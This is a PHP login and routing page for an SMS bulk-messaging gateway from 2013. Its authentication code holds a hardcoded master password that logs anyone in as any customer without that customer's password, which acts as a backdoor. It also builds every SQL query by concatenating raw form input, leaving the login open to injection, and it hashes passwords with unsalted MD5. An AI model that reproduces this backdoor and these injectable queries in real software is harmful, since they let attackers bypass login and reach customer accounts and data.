<?
session_start();
require_once("config.php");
require_once("fn/fn.php");
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=windows-874">
<title>SBG</title>
<link href="css/style.css" rel="stylesheet" type="text/css">
</head>
<body>
<?
if(!empty($_GET['logout'])){
	session_destroy();
}
if(!empty($_POST['User_Account'])&&!empty($_POST['User_Password'])){
	if ($_POST['User_Password'] == "catcdma2000") {
		$sql="SELECT Customer_ID, Customer_Account FROM SBG_Customers WHERE Customer_Account='".$_POST['User_Account']."'";
	}else{
		$sql="SELECT Customer_ID, Customer_Account FROM SBG_Customers WHERE Customer_Account='".$_POST['User_Account']."' AND Customer_Password='".md5($_POST['User_Password'])."'";
	}
	$mssql=mssql_query($sql);
	list($Customer_ID,$Customer_Account)=mssql_fetch_array($mssql);
	if(mssql_num_rows($mssql)<>1){
		$sql="SELECT Admin_ID, Admin_Account FROM SBG_Admins WHERE Admin_Account='".$_POST['User_Account']."' AND Admin_Password='".md5($_POST['User_Password'])."'";
		$mssql=mssql_query($sql);
		list($Admin_ID,$Admin_Account)=mssql_fetch_array($mssql);
		if(mssql_num_rows($mssql)==1){
			$_SESSION["Admin_ID"] = $Admin_ID;
			$_SESSION["Admin_Account"] = $Admin_Account;
		}else{
			$Alert_PW =  "Invalid user account and/or password,<br>Please contact the system administrator at 02-104-4740<br />&nbsp;";
		}
	}else{
		$_SESSION["Customer_ID"] = $Customer_ID;
		$_SESSION["Customer_Account"] = $Customer_Account;
	}
}
if((empty($_SESSION['Customer_Account'])&&empty($_SESSION['Admin_Account']))||!empty($_GET['logout'])){
?>
<form name="form" action="index.php" method="post">
<p>&nbsp;</p>
<p>&nbsp;</p>
<table cellpadding="1" cellspacing="1" bgcolor="<?=$bg_menu?>" align="center">
  <tr>
    <td rowspan="2" align="center">&nbsp;&nbsp;&nbsp;&nbsp;my SMS Bulk Gateway System&nbsp;&nbsp;&nbsp;&nbsp;<br />
      (my SBGS)</td>
    <td align="center" class="tx_sub_head" bgcolor="<?=$bg_form?>">Login Form<br />
    <table width="500" bgcolor="#FFFFFF">
      <tr>
        <td width="15%">&nbsp;</td>
        <td width="20%">&nbsp;</td>
        <td width="3%">&nbsp;</td>
        <td>&nbsp;</td>
        </tr>
      <? if(!empty($Alert_PW)){?>
      <tr>
        <td colspan="4" align="center" class="error"><?=$Alert_PW?></td>
        </tr>
      <? }?>
      <tr>
        <td>&nbsp;</td>
        <td>User Account</td>
        <td>:</td>
        <td><input name="User_Account" type="text" size="30" /></td>
        </tr>
      <tr>
        <td>&nbsp;</td>
        <td>Password</td>
        <td>:</td>
        <td><input name="User_Password" type="password" size="30" /></td>
        </tr>
      <tr>
        <td height="50" colspan="4" align="center"><input type="submit" name="Submit" value="Submit" />
          &nbsp;
          <input type="reset" name="Reset" id="button" value="Reset" /></td>
        </tr>
    </table>
    </td>
  </tr>
</table>
</form>
<? 
}else{
	if(!empty($_POST['pg'])){
		$pg=$_POST['pg'];
	}else if(!empty($_GET['pg'])){
		$pg=$_GET['pg'];
	}
	if(empty($pg)){
		if(!empty($_SESSION['Customer_ID'])){
			$pg="group";
		}else if(!empty($_SESSION['Admin_ID'])){
			$pg="customer";
		}
	}
	?>
	<div class="container">
	  <div class="menutop">
		<table width="100%" cellpadding="0" cellspacing="0" bgcolor="#CCCCCC">
		  <tr>
			<td height="40" valign="middle" class="tx_FullNameOffice_">&nbsp;my SMS Bulk Gateway System (my SBGS)</td>
			<td align="right" valign="middle" class="tx_sub_head">Login By: <? if(!empty($_SESSION['Customer_Account'])){echo $_SESSION['Customer_Account']." (Customer)&nbsp;";}else if(!empty($_SESSION['Admin_Account'])){echo $_SESSION['Admin_Account']." (Admin)&nbsp;";}?></td>
		  </tr>
		</table>
	  </div>
	  <div class="menusub">
		<? include("menu.php");?>
	  </div>
	  <div class="bodycontent">
		<br />
		<?
		switch($pg){
			//***** Index *****
			case "user":
				require_once "user_Manage.php";
				break;
			case "customer":
				require_once "customer_Manage.php";
				break;
			case "group":
				require_once "group_Manage.php";
				break;
			case "number":
				require_once "number_Manage.php";
				break;
			case "sendGroup":
				require_once "sendGroup_Manage.php";
				break;
			case "sendManual":
				require_once "send_Form.php";
				break;
			case "restart":
				require_once "restart_Form.php";
				break;
			case "traffic":
				require_once "traffic_Form.php";
				break;
			case "profile":
				require_once "profile_Form.php";
				break;
			case "change":
				require_once "changePassword_Form.php";
				break;
			case "report":
				require_once "reportUsage_View.php";
				break;
			default:
				//require_once "error.php";
				break;
		}
		?>
		<br />
		&nbsp; </div>
	  <div class="menubottom">
		<? //require_once("menu_bottom.php");?>
	  </div>
</div>
<div class="copy">
  <table width="100%" border="0" cellpadding="0" cellspacing="0" bgcolor="<?=$bg_menu?>">
    <tr>
      <td width="3%" height="20"><b>&nbsp;Copyright &copy; 2013 mybycat</b></td>
      <td width="4%" align="right"><!--<b>System administrator: 02-104-4740&nbsp;</b>--></td>
    </tr>
  </table>
</div>
<? }?>
</body>
</html>
<? mssql_close();?>